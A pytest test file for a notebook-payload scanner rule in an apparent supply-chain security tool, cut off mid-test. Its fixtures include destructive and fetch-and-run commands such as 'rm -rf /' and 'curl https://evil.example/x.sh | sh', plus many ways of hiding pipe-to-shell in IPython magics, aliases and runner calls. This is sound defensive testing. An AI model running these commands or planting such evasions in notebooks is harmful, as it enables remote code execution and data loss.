import json
import os
from pathlib import Path

import pytest
from guardana.core.report import ShortfallKind
from guardana.core.rule import RuleContext
from guardana.core.target import ArtifactTarget
from guardana.rules.supply_chain._ipython_cells import read_cell
from guardana.rules.supply_chain._reading import MAX_SCAN_BYTES
from guardana.rules.supply_chain.notebook_payload import NotebookPayloadRule


def _notebook(*cell_sources: str) -> str:
    cells = [{"cell_type": "code", "source": src} for src in cell_sources]
    return json.dumps({"cells": cells, "nbformat": 4})


def _findings(tmp_path: Path) -> list[tuple[str, str]]:
    rule = NotebookPayloadRule()
    return [
        (f.severity.name, f.evidence.summary)
        for f in rule.run(ArtifactTarget(tmp_path), RuleContext())
    ]


def _unread(root: Path) -> list[str]:
    """The files the rule names as unread components when run over `root`."""
    ctx = RuleContext()
    list(NotebookPayloadRule().run(ArtifactTarget(root), ctx))
    return [
        gap.name
        for gap in ctx.shortfalls()
        if gap.kind is ShortfallKind.UNEXAMINED_COMPONENT
        and gap.detail.startswith("guardana.supply_chain.notebook_payload could not read it: ")
    ]


def test_flags_python_code_sink_in_a_cell(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("import os\nos.system('rm -rf /')\n"))
    findings = _findings(tmp_path)
    assert any(sev == "HIGH" and "os.system" in why for sev, why in findings)


def test_flags_curl_pipe_to_shell_escape(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("!curl https://evil.example/x.sh | sh\n"))
    findings = _findings(tmp_path)
    assert any(sev == "HIGH" and "shell" in why for sev, why in findings)


def test_flags_pipe_to_shell_in_a_bash_cell_magic(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("%%bash\nwget -qO- https://evil/x | bash\n"))
    assert any(sev == "HIGH" for sev, _ in _findings(tmp_path))


def test_source_as_list_of_lines_is_handled(tmp_path: Path) -> None:
    cells = [{"cell_type": "code", "source": ["import os\n", "os.system('id')\n"]}]
    (tmp_path / "nb.ipynb").write_text(json.dumps({"cells": cells}))
    assert any("os.system" in why for _, why in _findings(tmp_path))


def test_benign_notebook_is_clean(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(
        _notebook("import numpy as np\nx = np.zeros(3)\n", "!pip install numpy\nprint(x)\n")
    )
    assert _findings(tmp_path) == []


def test_unparseable_cell_is_surfaced_not_silently_skipped(tmp_path: Path) -> None:
    # A cell of Python that does not parse is not proven clean — it must appear as
    # a visible (LOW) lead, never be dropped into silence.
    (tmp_path / "nb.ipynb").write_text(_notebook("def (this is not valid python\n"))
    findings = _findings(tmp_path)
    assert any(sev == "LOW" and "could not be parsed" in why for sev, why in findings)
    # A cell is part of a notebook that was read, so the run is not short of a file.
    assert _unread(tmp_path) == []


def test_markdown_cells_are_ignored(tmp_path: Path) -> None:
    cells = [{"cell_type": "markdown", "source": "os.system('x') in prose\n"}]
    (tmp_path / "nb.ipynb").write_text(json.dumps({"cells": cells}))
    assert _findings(tmp_path) == []


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="mkfifo is POSIX-only")
def test_an_unreadable_notebook_is_unverified_not_clean(tmp_path: Path) -> None:
    os.mkfifo(tmp_path / "nb.ipynb")

    findings = list(NotebookPayloadRule().run(ArtifactTarget(tmp_path), RuleContext()))

    assert [f.title for f in findings] == ["Notebook not scanned"]
    assert findings[0].verdict is not None
    assert findings[0].verdict.outcome == "inconclusive"
    assert _unread(tmp_path) == [str(tmp_path / "nb.ipynb")]


def test_a_notebook_past_the_read_bound_says_so(tmp_path: Path) -> None:
    padded = _notebook("x = 1\n" + "#" * MAX_SCAN_BYTES, "import os\nos.system('id')\n")
    (tmp_path / "nb.ipynb").write_text(padded)

    findings = list(NotebookPayloadRule().run(ArtifactTarget(tmp_path), RuleContext()))

    assert [f.title for f in findings] == ["Notebook not scanned"]
    assert "read bound" in findings[0].evidence.summary
    assert _unread(tmp_path) == [str(tmp_path / "nb.ipynb")]


@pytest.mark.parametrize("text", ["{ not json", '{"nbformat": 4}'], ids=["not-json", "no-cells"])
def test_a_notebook_that_cannot_be_parsed_is_a_named_shortfall(tmp_path: Path, text: str) -> None:
    (tmp_path / "nb.ipynb").write_text(text)

    findings = list(NotebookPayloadRule().run(ArtifactTarget(tmp_path), RuleContext()))

    assert [f.title for f in findings] == ["Notebook not scanned"]
    assert _unread(tmp_path) == [str(tmp_path / "nb.ipynb")]


@pytest.mark.parametrize(
    "cell",
    [
        '%time os.system("true")\n',
        '%timeit -n1 -r1 eval("1")\n',
        '%timeit -n 1 -r 1 -q eval("1")\n',
        '%timeit -qn1 -- eval("1")\n',
        '%prun -s cumulative -q exec("x = 1")\n',
        '%prun -l5 -T out.txt exec("x = 1")\n',
        '%debug os.system("id")\n',
        '%debug -b setup.py:3 os.system("id")\n',
        '%debug --breakpoint=setup.py:3 os.system("id")\n',
        '%debug --breakpoint setup.py:3 os.system("id")\n',
        'for _ in range(1):\n    %time os.system("id")\n',
    ],
)
def test_a_line_magic_that_runs_python_is_scanned_as_python(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("import os\n" + cell))
    assert [sev for sev, _ in _findings(tmp_path)] == ["HIGH"]


@pytest.mark.parametrize(
    "cell",
    [
        "%time sum([1])\n",
        "%timeit -n1 -r1 sum([1])\n",
        "%prun -q sum([1])\n",
        "%debug -b setup.py:3 sum([1])\n",
        "%debug\n",
        "%matplotlib inline\n%load_ext autoreload\n",
    ],
)
def test_a_line_magic_running_harmless_python_is_clean(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert _findings(tmp_path) == []


@pytest.mark.parametrize("magic", ["%system", "%sx"])
def test_a_shell_line_magic_piping_a_download_into_sh_is_flagged(
    tmp_path: Path, magic: str
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(f"{magic} curl https://evil.example/x | sh\n"))
    findings = _findings(tmp_path)
    assert [sev for sev, _ in findings] == ["HIGH"]
    assert "shell" in findings[0][1]


@pytest.mark.parametrize("magic", ["%system", "%sx"])
def test_a_shell_line_magic_without_a_pipe_to_shell_is_clean(tmp_path: Path, magic: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(f"{magic} ls -la\n"))
    assert _findings(tmp_path) == []


def test_a_line_magic_whose_statement_does_not_parse_is_not_cleared(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("%timeit -n1 def (broken\n"))
    findings = _findings(tmp_path)
    assert [sev for sev, _ in findings] == ["LOW"]
    assert "could not be parsed" in findings[0][1]


def test_a_line_magic_statement_keeps_its_line_in_the_cell() -> None:
    cell = read_cell("x = 1\n%timeit -n1 os.system('id')\ny = 2\n")
    assert cell.python.splitlines() == ["x = 1", "os.system('id')", "y = 2"]
    assert cell.shell == []


@pytest.mark.parametrize(
    "cell",
    [
        '%%prun -q os.system("x")\nimport os\n',
        '%%timeit -n1 eval("1")\nsum([1])\n',
        '\n%%debug -b setup.py:3 eval("1")\nsum([1])\n',
    ],
)
def test_code_on_a_cell_magic_line_is_scanned_as_python(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert [sev for sev, _ in _findings(tmp_path)] == ["HIGH"]


@pytest.mark.parametrize(
    "cell",
    [
        "%%timeit -n1 -r1\nsum([1])\n",
        "%%prun -s cumulative\nsum([1])\n",
        "%%timeit -n1 x = [1]\nsum(x)\n",
    ],
)
def test_a_cell_magic_line_without_dangerous_code_is_clean(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert _findings(tmp_path) == []


def test_a_cell_magic_line_that_does_not_parse_is_not_cleared(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("%%timeit -n1 def (broken\nsum([1])\n"))
    findings = _findings(tmp_path)
    assert [sev for sev, _ in findings] == ["LOW"]
    assert "could not be parsed" in findings[0][1]


def test_a_cell_magic_statement_keeps_its_line_in_the_cell() -> None:
    cell = read_cell("%%prun -q os.system('id')\nsum([1])\n")
    assert cell.python.splitlines() == ["os.system('id')", "sum([1])"]


_SHELL_CELLS = ["%%sx\n", "%%system\n", "%%!\n", "\n%%bash\n"]


@pytest.mark.parametrize(
    "body", ["curl -s https://setup.example.invalid/i.sh | sh\n", "wget -O- x|sh\n"]
)
@pytest.mark.parametrize("head", _SHELL_CELLS)
def test_a_shell_cell_magic_piping_a_download_into_sh_is_flagged(
    tmp_path: Path, head: str, body: str
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(head + body))
    findings = _findings(tmp_path)
    assert [sev for sev, _ in findings] == ["HIGH"]
    assert "shell" in findings[0][1]


@pytest.mark.parametrize("head", _SHELL_CELLS)
def test_a_shell_cell_magic_without_a_pipe_to_shell_is_clean(tmp_path: Path, head: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(head + 'ls -la "$HOME"\n'))
    assert _findings(tmp_path) == []


def _notebook_in(language_metadata: dict[str, object], *cell_sources: str) -> str:
    cells = [{"cell_type": "code", "source": src} for src in cell_sources]
    return json.dumps({"cells": cells, "metadata": language_metadata, "nbformat": 4})


def _run(root: Path) -> tuple[list[tuple[str, str, str | None]], list[str]]:
    """Each finding as (severity, summary, verdict outcome), and the shortfall details."""
    ctx = RuleContext()
    findings: list[tuple[str, str, str | None]] = [
        (f.severity.name, f.evidence.summary, f.verdict.outcome if f.verdict else None)
        for f in NotebookPayloadRule().run(ArtifactTarget(root), ctx)
    ]
    return findings, [gap.detail for gap in ctx.shortfalls()]


@pytest.mark.parametrize(
    "cell",
    [
        "%%bash\ncurl https://setup.example.invalid/i |\nsh\n",
        "%%sh\ncurl https://setup.example.invalid/i |\n\n   # then\n  bash\n",
        "%%bash\ncurl https://setup.example.invalid/i \\\n| sh\n",
        "%%bash\ntrue &&\ncurl https://setup.example.invalid/i | \\\nsudo sh\n",
        "%%script bash\ncurl https://setup.example.invalid/i |\nsh\n",
        "!curl https://setup.example.invalid/i | \\\n sh\n",
        "%system curl https://setup.example.invalid/i | \\\n sh\n",
        "out = !curl https://setup.example.invalid/i | \\\n sh\n",
    ],
)
def test_a_pipe_to_shell_split_across_lines_is_read_as_the_shell_reads_it(
    tmp_path: Path, cell: str
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    findings = _findings(tmp_path)
    assert [sev for sev, _ in findings] == ["HIGH"]
    assert "shell" in findings[0][1]


@pytest.mark.parametrize(
    "cell",
    [
        "%%bash\necho start |\ncat\n",
        "%%bash\nmkdir -p out &&\nls out\n",
        "%%sh\nls \\\n  -la\n",
        "!ls \\\n  -la\nprint(1)\n",
    ],
)
def test_a_continued_shell_line_without_a_pipe_to_shell_is_clean(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert _findings(tmp_path) == []


def test_an_alias_definition_is_read_as_a_shell_command(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(
        _notebook("%alias fetch curl https://setup.example.invalid/i | sh\n", "%fetch\n")
    )
    findings, shortfalls = _run(tmp_path)
    # Flagged where it is defined and again in the cell that calls it.
    assert [sev for sev, _, _ in findings] == ["HIGH", "HIGH"]
    assert shortfalls == []


def test_a_call_of_a_defined_alias_resolves_to_its_command(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(
        _notebook("%alias get curl %s\n", "%get https://setup.example.invalid/i | sh\n")
    )
    findings, shortfalls = _run(tmp_path)
    assert [sev for sev, _, _ in findings] == ["HIGH"]
    assert shortfalls == []


def test_a_harmless_alias_and_its_call_are_clean(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("%alias listing ls -la %s\n", "%listing out\n"))
    assert _run(tmp_path) == ([], [])


@pytest.mark.parametrize(
    ("cell", "magic"),
    [
        ("%run /tmp/payload.py\n", "%run"),
        ("%load_ext some_extension\n", "%load_ext"),
        ("%reload_ext some_extension\n", "%reload_ext"),
        ("%pip install some-package\n", "%pip"),
        ("%conda install some-package\n", "%conda"),
        ("x = 1\n%not_a_known_magic arg\n", "%not_a_known_magic"),
        ('%%perl\nsystem("curl https://setup.example.invalid/i | sh");\n', "%%perl"),
        ("%%ruby\nputs 1\n", "%%ruby"),
        ("%%R\nx <- 1\n", "%%R"),
        ('%%script perl\nsystem("curl https://setup.example.invalid/i | sh");\n', "%%script perl"),
        ("%%html\n<p>hi</p>\n", "%%html"),
        ("%%unknown_cell_magic\nx = 1\n", "%%unknown_cell_magic"),
    ],
)
def test_a_magic_that_runs_what_the_rule_cannot_read_is_inconclusive_and_a_shortfall(
    tmp_path: Path, cell: str, magic: str
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    findings, shortfalls = _run(tmp_path)
    assert [(sev, outcome) for sev, _, outcome in findings] == [("LOW", "inconclusive")]
    assert magic in findings[0][1]
    assert len(shortfalls) == 1
    assert shortfalls[0].startswith("guardana.supply_chain.notebook_payload could not read it: ")
    assert magic in shortfalls[0]
    assert _unread(tmp_path) == [str(tmp_path / "nb.ipynb")]


def test_python_after_an_unread_line_magic_is_still_scanned(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("%run helper.py\nimport os\nos.system('id')\n"))
    findings, _ = _run(tmp_path)
    assert sorted(sev for sev, _, _ in findings) == ["HIGH", "LOW"]


def test_a_python_script_cell_is_read_as_python(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("%%script python3\nimport os\nos.system('id')\n"))
    findings, shortfalls = _run(tmp_path)
    assert [sev for sev, _, _ in findings] == ["HIGH"]
    assert shortfalls == []


def test_an_ordinary_notebook_with_common_magics_stays_clean(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(
        _notebook_in(
            {"kernelspec": {"language": "python"}, "language_info": {"name": "python"}},
            "%matplotlib inline\n%load_ext autoreload\n%autoreload 2\n",
            "%config InlineBackend.figure_format = 'retina'\n%env CUDA_VISIBLE_DEVICES=0\n",
            "%time total = sum([1, 2])\n%timeit -n1 sorted([3, 1])\n%cd /tmp\n%pwd\n",
            "%%time\nimport json\nprint(json.dumps({'ok': True}))\n",
            "%%capture output\nprint('quiet')\n",
            "%%bash\nls -la\n",
            "%ls\n",
        )
    )
    assert _run(tmp_path) == ([], [])


@pytest.mark.parametrize(
    "metadata",
    [
        {"kernelspec": {"name": "ir", "language": "R"}, "language_info": {"name": "R"}},
        {"kernelspec": {"name": "ir", "language": "R"}},
        {"language_info": {"name": "julia"}},
        {"kernelspec": {"language": "python"}, "language_info": {"name": "R"}},
    ],
)
def test_a_notebook_in_another_language_is_inconclusive_and_a_shortfall(
    tmp_path: Path, metadata: dict[str, object]
) -> None:
    (tmp_path / "nb.ipynb").write_text(
        _notebook_in(metadata, 'system("curl https://setup.example.invalid/i | sh")\n')
    )
    findings, shortfalls = _run(tmp_path)
    assert [(sev, outcome) for sev, _, outcome in findings] == [("LOW", "inconclusive")]
    assert "language" in findings[0][1]
    assert _unread(tmp_path) == [str(tmp_path / "nb.ipynb")]
    assert len(shortfalls) == 1


@pytest.mark.parametrize(
    "metadata",
    [
        {"kernelspec": {"name": "python3", "language": "python"}},
        {"language_info": {"name": "python", "version": "3.12.0"}},
        {},
    ],
)
def test_a_python_notebook_or_one_naming_no_language_is_scanned(
    tmp_path: Path, metadata: dict[str, object]
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook_in(metadata, "import os\nos.system('id')\n"))
    findings, shortfalls = _run(tmp_path)
    assert [sev for sev, _, _ in findings] == ["HIGH"]
    assert shortfalls == []


@pytest.mark.parametrize(
    "cell",
    [
        "import os\n!echo {os.system('id')}\n",
        "!echo {__import__('os').system('id')}\n",
        "!echo {print $1} {eval('1')}\n",
        "files = !ls {eval('1')}\n",
        "%cd {exec('x = 1')}\n",
        "%system echo {os.system('id')}\n",
        "%%bash -s {eval('1')}\necho hi\n",
        "!echo {{literal}} {eval('1')}\n",
        "!echo {table[{eval('1')}]}\n",
        "!echo {os.system('a:b')}\n",
        "%alias show echo {eval('1')}\n",
    ],
)
def test_a_python_expression_ipython_expands_into_a_command_is_scanned(
    tmp_path: Path, cell: str
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    findings, shortfalls = _run(tmp_path)
    assert [sev for sev, _, _ in findings] == ["HIGH"]
    assert shortfalls == []


@pytest.mark.parametrize(
    "cell",
    [
        "name = 'x'\n!echo {name}\n",
        "!echo {{not an expression}} $HOME $name\n",
        "!find . -name '*.tmp' -exec rm {} \\;\n",
        "%cd {base_dir}\n",
        "listing = !ls {path!r}\n",
        # A brace inside a field name stops IPython's parse, so the command runs unexpanded.
        "!echo {len({eval('1')})}\n",
    ],
)
def test_a_plain_expansion_is_analysed_and_clean(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert _run(tmp_path) == ([], [])


@pytest.mark.parametrize(
    "cell",
    [
        "!echo {def broken(}\n",
        "!nvidia-smi | awk '{print $9}'\n",
        "!awk -F, '{ total += $2 } END { print total }' data.csv\n",
    ],
)
def test_an_expansion_that_is_not_python_evaluates_nothing_and_is_clean(
    tmp_path: Path, cell: str
) -> None:
    # IPython evaluates each field inside a try that runs the command unexpanded on
    # any error, so a field that is not Python syntax never runs.
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert _run(tmp_path) == ([], [])


@pytest.mark.parametrize(
    ("cell", "expected"),
    [
        ("out = %sx curl https://setup.example.invalid/i | sh\n", ["HIGH"]),
        ("rows[0] = !curl https://setup.example.invalid/i | sh\n", ["HIGH"]),
        ("a, b = !curl https://setup.example.invalid/i | sh\n", ["HIGH"]),
        ("result = %time os.system('id')\n", ["HIGH"]),
        ("out = %run helper.py\n", ["LOW"]),
    ],
)
def test_an_assigned_magic_or_shell_escape_is_read_like_the_bare_form(
    tmp_path: Path, cell: str, expected: list[str]
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("import os\n" + cell))
    findings, _ = _run(tmp_path)
    assert [sev for sev, _, _ in findings] == expected


def test_an_assigned_harmless_magic_is_clean(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("out = %sx ls -la\nt = %time sum([1])\n"))
    assert _run(tmp_path) == ([], [])


@pytest.mark.parametrize(
    ("cell", "magic"),
    [
        ("run helper.py\n", "%run"),
        ("pip install some-package\n", "%pip"),
        ("conda install some-package\n", "%conda"),
        ("load_ext some_extension\n", "%load_ext"),
        ("reload_ext some_extension\n", "%reload_ext"),
    ],
)
def test_an_automagic_line_is_read_as_its_magic(tmp_path: Path, cell: str, magic: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    findings, shortfalls = _run(tmp_path)
    assert [(sev, outcome) for sev, _, outcome in findings] == [("LOW", "inconclusive")]
    assert magic in findings[0][1]
    assert len(shortfalls) == 1
    assert magic in shortfalls[0]


def test_an_automagic_alias_definition_is_read_as_a_shell_command(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(
        _notebook("alias fetch curl https://setup.example.invalid/i | sh\n")
    )
    findings, shortfalls = _run(tmp_path)
    assert [sev for sev, _, _ in findings] == ["HIGH"]
    assert shortfalls == []


@pytest.mark.parametrize(
    "cell",
    ["run = 3\n", "pip = {'a': 1}\nprint(pip)\n", "run(1)\n", "alias = 'x'\n", "load_ext\n"],
)
def test_a_magic_name_used_as_python_stays_clean(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("def run(x):\n    return x\n" + cell))
    assert _run(tmp_path) == ([], [])


@pytest.mark.parametrize(
    "body",
    ["import os\nos.system('id')\n", "!curl https://setup.example.invalid/i | sh\n"],
    ids=["python-sink", "shell-escape"],
)
def test_a_writefile_body_is_still_scanned(tmp_path: Path, body: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("%%writefile setup.py\n" + body))
    findings, _ = _run(tmp_path)
    assert [sev for sev, _, _ in findings] == ["HIGH"]


def test_a_dynamic_import_in_a_cell_resolves_like_a_static_one(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("__import__('os').system('id')\n"))
    assert [sev for sev, _, _ in _run(tmp_path)[0]] == ["HIGH"]


@pytest.mark.parametrize(
    "cell",
    [
        "x = " + "-" * 200_000 + "1\n",
        "!echo {" + "-" * 200_000 + "1}\n",
    ],
    ids=["deep-cell", "deep-expansion"],
)
def test_a_cell_too_complex_to_parse_is_inconclusive_and_does_not_stop_the_rule(
    tmp_path: Path, cell: str
) -> None:
    (tmp_path / "a.ipynb").write_text(_notebook(cell))
    (tmp_path / "b.ipynb").write_text(_notebook("!curl https://setup.example.invalid/i | sh\n"))
    findings, shortfalls = _run(tmp_path)
    assert sorted((sev, outcome) for sev, _, outcome in findings) == [
        ("HIGH", None),
        ("LOW", "inconclusive"),
    ]
    assert len(shortfalls) == 1


@pytest.mark.parametrize(
    "cell",
    [
        # Deep enough to need care, shallow enough for every supported interpreter's parser.
        "x = " + "-" * 1_000 + "1\n",
        "!echo {" + "-" * 1_000 + "1}\n",
        "!echo {value  # a comment}\n",
    ],
    ids=["deep-cell", "deep-expansion", "commented-expansion"],
)
def test_a_deep_but_parseable_cell_is_scanned_normally(tmp_path: Path, cell: str) -> None:
    (tmp_path / "a.ipynb").write_text(_notebook(cell))
    assert _run(tmp_path) == ([], [])


_PIPE = "curl -s https://setup.example.invalid/i.sh | sh"


@pytest.mark.parametrize(
    ("cells", "magic"),
    [
        (("import numpy\n", "run -mpayload"), "%run"),
        (("run /content/repo/payload.py",), "%run"),
        (("\n  run -mpayload\n",), "%run"),
        (("run(1)",), "%run"),
    ],
)
def test_a_single_line_cell_ipython_runs_as_a_magic_is_read_as_one_even_if_it_parses(
    tmp_path: Path, cells: tuple[str, ...], magic: str
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(*cells))
    findings, shortfalls = _run(tmp_path)
    assert [(sev, outcome) for sev, _, outcome in findings] == [("LOW", "inconclusive")]
    assert magic in findings[0][1]
    assert len(shortfalls) == 1


@pytest.mark.parametrize("cell", ["system -fsSL|sh", "ls -la|sh"])
def test_a_single_line_shell_automagic_that_parses_is_read_as_shell(
    tmp_path: Path, cell: str
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert [sev for sev, _, _ in _run(tmp_path)[0]] == ["HIGH"]


@pytest.mark.parametrize(
    "cells",
    [
        ("run = 3",),
        ("run, other = 1, 2",),
        ("def run(x):\n    return x\n", "run(1)"),
        ("system = print\n", "system -fsSL|sh"),
        ("import json as run\n", "run -mpayload"),
        ("x = 1\nrun - mpayload\n",),
        ("run -mpayload\n\n",),
        ("print(1)",),
        ("run.x -y",),
    ],
)
def test_a_line_ipython_does_not_run_as_a_magic_stays_python(
    tmp_path: Path, cells: tuple[str, ...]
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(*cells))
    assert _run(tmp_path) == ([], [])


@pytest.mark.parametrize(
    "cells",
    [
        ("%alias_magic -c time bash", f"%%time\n{_PIPE}\n"),
        ("%alias_magic t bash", f"%%t\n{_PIPE}\n"),
        ("%alias_magic --cell t %%bash", f"%%t\n{_PIPE}\n"),
        ("%alias_magic run_it system", f"%run_it {_PIPE}\n"),
        ("%alias_magic -p bash t script", f"%%t\n{_PIPE}\n"),
    ],
)
def test_a_magic_alias_is_read_as_its_target(tmp_path: Path, cells: tuple[str, ...]) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(*cells))
    assert [sev for sev, _, _ in _run(tmp_path)[0]] == ["HIGH"]


def test_a_magic_alias_of_another_language_is_inconclusive(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("%alias_magic -c t perl", "%%t\nprint 1;\n"))
    findings, shortfalls = _run(tmp_path)
    assert [(sev, outcome) for sev, _, outcome in findings] == [("LOW", "inconclusive")]
    assert len(shortfalls) == 1


def test_a_magic_alias_of_a_python_magic_stays_clean(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(
        _notebook("%alias_magic t timeit", "%t -n1 sum([1])\n", "%%t -n1\nsum([1])\n")
    )
    assert _run(tmp_path) == ([], [])


def test_after_rehashx_an_unknown_single_line_command_is_inconclusive(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("%rehashx", "sh<payload.sh"))
    findings, shortfalls = _run(tmp_path)
    assert [(sev, outcome) for sev, _, outcome in findings] == [("LOW", "inconclusive")]
    assert "%sh" in findings[0][1]
    assert len(shortfalls) == 1


@pytest.mark.parametrize(
    "cells",
    [
        ("sh<payload.sh",),
        ("%rehashx", "print(1)"),
        ("%rehashx", "x = 1\nsh<payload\n"),
        ("%rehashx", "value = 2\n", "value<3"),
    ],
)
def test_without_rehashx_or_with_a_known_name_a_line_stays_python(
    tmp_path: Path, cells: tuple[str, ...]
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(*cells))
    assert _run(tmp_path) == ([], [])


@pytest.mark.parametrize(
    "cell",
    [
        f"get_ipython().system('{_PIPE}')\n",
        f"get_ipython().getoutput('{_PIPE}')\n",
        f"get_ipython().run_line_magic('system', '{_PIPE}')\n",
        f"get_ipython().run_cell_magic('bash', '', '{_PIPE}\\n')\n",
        f"ip = get_ipython()\nip.system('{_PIPE}')\n",
        "get_ipython().run_cell(\"import os\\nos.system('id')\")\n",
        f"%%capture out\n!{_PIPE}\n",
    ],
)
def test_a_command_run_through_the_ipython_object_is_read_like_its_escape(
    tmp_path: Path, cell: str
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert [sev for sev, _, _ in _run(tmp_path)[0]] == ["HIGH"]


@pytest.mark.parametrize(
    ("cell", "label"),
    [
        ("get_ipython().run_line_magic('run', 'helper.py')\n", "%run"),
        ("get_ipython().system(command)\n", "get_ipython().system"),
        ("get_ipython().run_cell(source)\n", "get_ipython().run_cell"),
    ],
)
def test_an_ipython_object_call_the_rule_cannot_read_is_inconclusive(
    tmp_path: Path, cell: str, label: str
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    findings, shortfalls = _run(tmp_path)
    assert [(sev, outcome) for sev, _, outcome in findings] == [("LOW", "inconclusive")]
    assert label in findings[0][1]
    assert len(shortfalls) == 1


@pytest.mark.parametrize(
    "cell",
    [
        "get_ipython().run_line_magic('matplotlib', 'inline')\n",
        "get_ipython().system('ls -la')\n",
        "shell = get_ipython()\nshell.run_cell_magic('time', '', 'sum([1])')\n",
    ],
)
def test_a_harmless_ipython_object_call_is_clean(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert _run(tmp_path) == ([], [])


@pytest.mark.parametrize(
    "cell",
    [
        "get_ipython().run_cell_async(\"import os\\nos.system('id')\")\n",
        f"get_ipython().find_line_magic('system')('{_PIPE}')\n",
        f"get_ipython().find_cell_magic('bash')('', '{_PIPE}')\n",
        f"get_ipython().find_magic('bash', 'cell')('', '{_PIPE}')\n",
        f"getattr(get_ipython(), 'system')('{_PIPE}')\n",
        f"from IPython import get_ipython as g\ng().system('{_PIPE}')\n",
        "from IPython.core.getipython import get_ipython as g\n"
        f"shell = g()\nshell.system('{_PIPE}')\n",
        f"fetch = get_ipython\nfetch().getoutput('{_PIPE}')\n",
    ],
)
def test_every_way_of_reaching_an_ipython_runner_is_read(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert [sev for sev, _, _ in _run(tmp_path)[0]] == ["HIGH"]


@pytest.mark.parametrize(
    ("cell", "label"),
    [
        ("get_ipython().safe_execfile('evil.py')\n", "safe_execfile"),
        ("get_ipython().safe_execfile_ipy('evil.ipynb')\n", "safe_execfile_ipy"),
        ("get_ipython().safe_run_module('evil', {})\n", "safe_run_module"),
        ("get_ipython().run_code(compile(source, 'x', 'exec'))\n", "run_code"),
        ("get_ipython().run_ast_nodes(nodes, 'x')\n", "run_ast_nodes"),
        ("get_ipython().a_method_nobody_listed('x')\n", "a_method_nobody_listed"),
        ("runner = get_ipython().system\nrunner('ls')\n", "system"),
        ("getattr(get_ipython(), name)('x')\n", "getattr"),
        ("get_ipython().find_line_magic(name)('x')\n", "find_line_magic"),
        ("magic = get_ipython().find_line_magic('system')\nmagic('ls')\n", "find_line_magic"),
    ],
)
def test_an_ipython_object_use_the_rule_does_not_read_is_inconclusive(
    tmp_path: Path, cell: str, label: str
) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    findings, shortfalls = _run(tmp_path)
    assert [(sev, outcome) for sev, _, outcome in findings] == [("LOW", "inconclusive")]
    assert label in findings[0][1]
    assert len(shortfalls) == 1


@pytest.mark.parametrize(
    "cell",
    [
        "get_ipython().user_ns['x'] = 1\n",
        "get_ipython().push({'x': 1})\n",
        "get_ipython().events.register('pre_run_cell', print)\n",
        "if get_ipython() is not None:\n    print('in IPython')\n",
        "count = get_ipython().execution_count\n",
        "get_ipython().set_next_input('print(1)')\n",
    ],
)
def test_an_inert_use_of_the_ipython_object_is_clean(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    assert _run(tmp_path) == ([], [])


@pytest.mark.parametrize(
    "cell",
    [
        "def run(shell):\n    shell.system('ls')\nrun(get_ipython())\n",
        "ip = get_ipython()\nhelper(ip)\n",
        "ip = get_ipython()\nhelpers.install(shell=ip)\n",
        "launch(get_ipython)\n",
    ],
)
def test_the_ipython_object_handed_to_a_call_is_inconclusive(tmp_path: Path, cell: str) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
    findings, shortfalls = _run(tmp_path)
